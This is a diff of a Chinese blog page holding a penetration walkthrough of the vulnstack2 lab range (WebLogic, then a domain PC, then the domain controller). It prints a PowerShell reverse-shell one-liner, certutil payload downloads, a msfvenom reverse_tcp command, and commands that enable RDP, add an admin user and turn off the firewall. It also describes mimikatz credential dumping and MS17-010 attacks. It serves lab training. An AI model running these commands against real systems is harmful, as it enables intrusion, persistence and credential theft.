@@ -59,7 +59,7 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11321603-a3ff1e2974740d4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11321603-20582abddc5d234c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="c:/Users/55398/AppData/Roaming/Typora/typora-user-images/image-20200113155748378.png">
-<meta property="og:updated_time" content="2020-01-13T07:57:48.581Z">
+<meta property="og:updated_time" content="2020-01-13T08:22:23.477Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="红日安全靶场vulnstack2过程文档">
 <meta name="twitter:description" content="靶场连接：http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">
@@ -224,7 +224,7 @@
 <p> 红日安全平台_02过程文档</p>
 <p>[TOC]</p>
 <h3 id="前期靶场环境搭建"><a href="#前期靶场环境搭建" class="headerlink" title="前期靶场环境搭建"></a>前期靶场环境搭建</h3><p>下载链接： <a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a> </p>
-<h4 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h4><p><img src="https://upload-images.jianshu.io/upload_images/11321603-1ff3be7d09966fb9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<h4 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h4><p><img src="https://upload-images.jianshu.io/upload_images/11321603-1ff3be7d09966fb9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <h4 id="环境简介"><a href="#环境简介" class="headerlink" title="环境简介"></a>环境简介</h4><p><strong>DC:</strong></p>
 <p>登录密码：1qaz@WSX<br>IP：10.10.10.10OS：Windows 2012(64)</p>
 <p>应用：AD域</p>
@@ -243,109 +243,109 @@
 <p>web→PC→域控</p>
 <p>入口点web服务器192.168.111.80</p>
 <p>web机默认没有web服务，需要手动开启，这个环境中的是weblogic环境版本是10.3.6.0，默认在C://Oracle/Middleware/user_projects/domains/base_domain下有一个startWeblogic的批处理，运行它即可 </p>
-<h4 id="渗透web服务器"><a href="#渗透web服务器" class="headerlink" title="渗透web服务器"></a>渗透web服务器</h4><p><img src="https://upload-images.jianshu.io/upload_images/11321603-806268d130276621.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<h4 id="渗透web服务器"><a href="#渗透web服务器" class="headerlink" title="渗透web服务器"></a>渗透web服务器</h4><p><img src="https://upload-images.jianshu.io/upload_images/11321603-806268d130276621.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>开启页面发现weblogic v10.3.6.0 利用反序列化POC扫到CVE-2017-10271和CVE-2019-2725等漏洞</p>
 <p>上传菜刀jsp，尝试连接。</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-2d00e8bfd5c8e4fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-f5b90ece5042a34e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-2d00e8bfd5c8e4fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-f5b90ece5042a34e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>菜刀虽然可以读目录，但是会爆一堆乱码，而且文件不能上传。暂不利用。接着利用2725搞事。</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-96b2e4ecb58b6c18.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-96b2e4ecb58b6c18.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>低权限账户….无法新建用户。尝试反弹下shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行语句：</span><br><span class="line">powershell.exe -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&apos;192.168.111.128&apos;,6666);$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-1cd8c7f63a4bdb89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-1cd8c7f63a4bdb89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>同理弹到msf的 exploit/multi/handler 上面，创建一个session，尝试一下提权exp</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-f3429771af44ac49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-f3429771af44ac49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>执行失败….猜测是msf的反弹和powershell弹回来的不一样….所以返回了</p>
 <p>RuntimeError Could not get a hold of the session. ==&gt;运行时错误，无法获得会话的保持。</p>
 <p>请教了一波大佬，还是乖乖使用meterpreter的后门吧</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-4da3327f0ef77ac6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-4da3327f0ef77ac6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>生成exe文件，kali开个服务，exe挂在web目录下</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-0bae4f4ed77422c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-0bae4f4ed77422c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>靶机执行：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.111.128/obolu.exe</span><br></pre></td></tr></table></figure>
 <p>MSF开启监听</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-ab4c1f47b75b8790.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-ab4c1f47b75b8790.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>靶机执行命令</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-be17a0eca7391ba4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-be17a0eca7391ba4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>正常情况应该返回</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-45620ff05441b094.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-45620ff05441b094.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>但是poc小工具好像不会有回显，但是obolu.exe的确传上去了。执行在msf上面接受shell</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-ebe6b9579b9273a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-0408a197eb3c917f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-ebe6b9579b9273a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-0408a197eb3c917f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>参考网上文章用的ms18_8120,直接利用meterpreter的session提权一下，</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-e3d03bdb8f814129.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-e3d03bdb8f814129.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>通过system权限尝试获取hash</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-943b033cbf690623.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-943b033cbf690623.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>尝试下mimikatz能不能读一下明文,答案是读不到….</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-e1230d05d6e79099.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-e1230d05d6e79099.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>被迫还是采用开3389+新建用户+关墙+传mimikatz的办法….</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">开3389:</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line">添加用户：</span><br><span class="line">net user obolu LZXlzx123 /add</span><br><span class="line">用户加管理组：</span><br><span class="line">net localgroup administrators obolu /add</span><br><span class="line">关墙：netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
 <p>这里比较狗屎，服务器做了策略，猜测是只有的de1ay域用户可以登录服务器，而刚新建的用户应该是作为WEB的用户.</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-519a398710ef07d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-519a398710ef07d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>所以需要加上域名登录，如图</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-00b2c27578b29b94.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-00b2c27578b29b94.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>登录成功发现靶机开启360安全卫士。可能之前msf失败被其拦截。关闭之。上传mimikatz，读到de1ay用户的密码为：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-39ca47f14cdd3b4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-39ca47f14cdd3b4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>同时读到了mssql用户的密码</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-24a3eb2c999c3464.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-24a3eb2c999c3464.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>内网探测一下，结合Nmap对内网10.10.10.1/24段和arp表内信息，确定两台主机存活，内网地址分别为</p>
 <p>10.10.10.10：开放端口、版本信息如下</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-6429c61a92290a36.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-ec0ad9d58287cc0f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-6429c61a92290a36.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-ec0ad9d58287cc0f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>10.10.10.201：开放端口、版本信息如下</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-c2c16846dcd5ec24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-ae6aa89531d9846c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-c2c16846dcd5ec24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-ae6aa89531d9846c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>结合DNS服务器信息，猜测10.10.10.10的server12是域控，10.10.10.201是个人终端PC机。</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-b0515e6816630784.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-b0515e6816630784.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <h4 id="渗透PC终端"><a href="#渗透PC终端" class="headerlink" title="渗透PC终端"></a>渗透PC终端</h4><p>想偷奸耍滑一下，尝试使用得到的mssql进行登录，发现该用户无法使用RDP(这里猜测之前直接用web服务器system的shell可以直接试一下撞hash….但是试验后才想起来….PC个人终端用户名mssql这个有点扯)</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-1015fd651c3ed6b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-1015fd651c3ed6b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>乖乖通过web服务器利用EW开正向代理，命令如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s ssocksd -l 1080</span><br><span class="line">Kali客户端用的ProxyChains</span><br></pre></td></tr></table></figure>
 <p>Kali配置/etc/proxychains.conf文件， 将proxychains.conf文件中的dynamic_chain前面的注释符取消，并修改文末socks5为靶机IP和端口，配置如下</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-8070daf5cb166aa4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-8070daf5cb166aa4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>(PS：此处为了配置成kali和web服务器能ping通，而且192.168.111和10.10.10.两个网段都是内网，Kali不应当配内网IP。我的解决办法是多给web服务器配了个ip，用来模拟公网IP，配置如下：</p>
 <p>WEB服务器为192.168.40.130、Kali为192.168.40.138)</p>
 <p>利用万金油17-010POC扫一下，同时证明代理开成功了。</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-0d6a0c9a0ec61218.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-0d6a0c9a0ec61218.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>但是msf不太好用…</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-6d09e0a2531bd4ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-6d09e0a2531bd4ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>暂时卡住。</p>
 <h4 id="渗透域控服务器DC"><a href="#渗透域控服务器DC" class="headerlink" title="渗透域控服务器DC"></a>渗透域控服务器DC</h4><p>17-010扫描一下，发现可能有洞。</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-7fccba0786a2de7a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-7fccba0786a2de7a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>win8版的17-010不太稳，容易出</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-3179b137df67bc43.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-3179b137df67bc43.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>尝试命令执行模块</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-df069cb5d88c1506.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-df069cb5d88c1506.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>发现直接就是system权限，但是DC不出网…无法反弹shell之类的。</p>
 <p>实战中可以使用DNSlog等方式进行数据外带…..但是靶机的话..配的纯封闭网，主机都不通，所以这个路也走不通</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-125deec475f6fbb0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-125deec475f6fbb0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>目前思路有三个：</p>
 <p>一、  发现DC未安装KB3011780  ，可以通过MS14_068这条路得到域控管理员shell，进而可以登录刚才未得到权限的win7_PC机.</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-b50ec754f765cabe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-b50ec754f765cabe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>二、可以通过在WEB服务器部署meterpreter的后门文件（参考一开始攻击web服务器的方法），利用certutil.exe和DC服务器的命令执行权限，反弹域管理员的shell出来，但是有两个问题：</p>
 <p>1.DC需要能和Kali通    2.这个shell也是域管理员的，不是system.</p>
 <p>三、通过直接利用system权限的命令执行，关闭域防火墙，新建用户通过WEB服务器直接RDP登录DC，但是两层RDP会很卡。</p>
 <p>因为思路1和3和红日靶场1类似，这里不再赘述，实施一下思路2.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">route add 192.168.40.0 MASK 255.255.255.0 10.10.10.80</span><br></pre></td></tr></table></figure>
 <p>查看路由如下：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-47d8367efffa8d3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-47d8367efffa8d3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>添加一条通往公网Kali的经过WEB服务器的路由</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-b3e58f053082ede7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-b3e58f053082ede7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>再次查看发现已经开通</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-48d221bfca3963d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-48d221bfca3963d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>这时应该DC可以通kali了，作死尝试17-010，结果喜闻乐见</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-18c3cad86e2fa257.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-18c3cad86e2fa257.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>还是得乖乖的走certutil</p>
 <p>利用meterpreter生成后门文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">生成后门：</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.40.138 lport=6666 -f exe -o  shell.exe</span><br><span class="line">DC下载：</span><br><span class="line">certutil.exe -urlcache -split -f http://10.10.10.80:8888/shell.exe</span><br></pre></td></tr></table></figure>
 <p>将msf生成的后门文件部署到WEB服务器，通过命令执行下载该文件</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-107238444c3eebf0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-107238444c3eebf0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>同时开启第二个msf接受反弹shell</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-a3ff1e2974740d4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-a3ff1e2974740d4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
 <p>执行shell.exe，并未收到反弹….猜测是web服务器的地址并未像路由器一样转发DC的请求….而windows默认关闭了IP转发的功能….</p>
 <p>修改注册表信息<br>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\IPEnableRouter<br>修改为 1 </p>
-<p><img src="https://upload-images.jianshu.io/upload_images/11321603-20582abddc5d234c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
-<p><img src="C:\Users\55398\AppData\Roaming\Typora\typora-user-images\image-20200113155748378.png" alt="image-20200113155748378"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-20582abddc5d234c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="C:\Users\55398\AppData\Roaming\Typora\typora-user-images\image-20200113155748378.png" alt></p>
 <p>此时DC可以ping通192.168.40.0/24网段….但是还是不通192.168.40.138(kali)</p>
 <p>心态略崩….纠结结合一下”web服务器”和”DC服务器”的命令执行权限，是否可以通过二层代理直接把kali流量和DC流量交互…改天学习一下</p>
 
@@ -604,11 +604,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">web学习</a>
+                <a href="javascript:void(0)" class="js-tag color5">知识收藏</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">知识收藏</a>
+                <a href="javascript:void(0)" class="js-tag color1">web学习</a>
               </li>
              
               <li class="article-tag-list-item">
